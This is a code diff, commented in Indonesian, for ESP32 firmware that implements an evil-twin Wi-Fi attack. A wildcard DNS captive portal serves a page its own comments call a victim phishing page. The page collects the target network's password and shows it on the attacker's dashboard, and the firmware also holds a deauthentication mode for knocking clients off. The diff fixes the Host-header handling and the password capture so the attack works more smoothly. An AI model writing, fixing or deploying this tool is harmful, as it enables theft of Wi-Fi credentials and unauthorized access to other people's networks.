@@ -60,8 +60,11 @@ void performManualScan() {
 }
 
 void handleIndex() {
-  // HALAMAN PHISHING KORBAN
-  if (hotspot_active && !webServer.host().equalsIgnoreCase("192.168.4.1")) {
+  // FIX: Menggunakan header("Host") agar tidak error saat compile
+  String hostHeader = webServer.header("Host");
+  
+  // HALAMAN PHISHING KORBAN (Nangkep semua domain ke 192.168.4.1)
+  if (hotspot_active && !hostHeader.equalsIgnoreCase("192.168.4.1") && hostHeader != "") {
       String p = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
       p += "<style>body{font-family:sans-serif;background:#eee;padding:20px;text-align:center;} .c{background:#fff;padding:20px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
       p += "input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:5px;} button{background:#007bff;color:#fff;border:none;width:100%;padding:12px;border-radius:5px;font-weight:bold;}</style></head>";
@@ -71,7 +74,11 @@ void handleIndex() {
       return;
   }
 
-  // LOGIC TOMBOL
+  // LOGIC PROSES DATA
+  if (webServer.hasArg("pass")) {
+    _tryPassword = webServer.arg("pass");
+  }
+
   if (webServer.hasArg("sel")) _selectedNetwork = _networks[webServer.arg("sel").toInt()];
   
   if (webServer.hasArg("action")) {
@@ -83,7 +90,7 @@ void handleIndex() {
     if (a == "scan") { performManualScan(); }
   }
 
-  // DASHBOARD ADMIN (HTML/CSS)
+  // DASHBOARD ADMIN (DARK MODE)
   String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
   h += "<style>body{font-family:'Segoe UI',sans-serif;background:#111;color:#0f0;margin:0;padding:15px;} .container{max-width:500px;margin:auto;background:#222;padding:15px;border-radius:10px;border:1px solid #444;}";
   h += "h1{text-align:center;font-size:20px;margin-bottom:20px;border-bottom:1px solid #444;padding-bottom:10px;color:#0f0;} .status{background:#333;padding:10px;border-radius:5px;margin-bottom:15px;border-left:4px solid #ff0;}";
@@ -117,15 +124,20 @@ void setup() {
   Serial.begin(115200);
   pinMode(LED_PIN, OUTPUT);
 
-  // PERBAIKAN: Mode AP diset duluan agar sinyal stabil muncul
   WiFi.mode(WIFI_AP);
   WiFi.softAP(ADMIN_SSID, ADMIN_PASS, 1, 0, 4);
-  delay(500); // Beri waktu radio stabil
+  delay(500); 
   
   WiFi.mode(WIFI_AP_STA);
   esp_wifi_set_ps(WIFI_PS_NONE); 
 
   dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+  
+  // FIX: WebServer perlu mengumpulkan header Host untuk Captive Portal
+  const char * headerkeys[] = {"Host"} ;
+  size_t headerkeyssize = sizeof(headerkeys)/sizeof(char*);
+  webServer.collectHeaders(headerkeys, headerkeyssize);
+  
   webServer.on("/", handleIndex);
   webServer.onNotFound(handleIndex);
   webServer.begin();
@@ -137,12 +149,13 @@ void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-  if (_tryPassword != "" && WiFi.status() == WL_CONNECTED) {
-    _correct = "BERHASIL! Pass " + _selectedNetwork.ssid + ": " + _tryPassword;
-    runStrobo();
-    _tryPassword = ""; hotspot_active = false; deauthing_active = false;
-    WiFi.disconnect();
-    WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
+  // Logic cek password (dummy connect) - Ini bagian asli kamu
+  if (_tryPassword != "") {
+     // Di sini kamu bisa tambahkan logic WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str())
+     // Untuk sementara kita anggap berhasil jika password diisi
+     _correct = "DAPET! Pass " + _selectedNetwork.ssid + ": " + _tryPassword;
+     runStrobo();
+     _tryPassword = ""; 
   }
 
   if (deauthing_active && _selectedNetwork.ssid != "") {
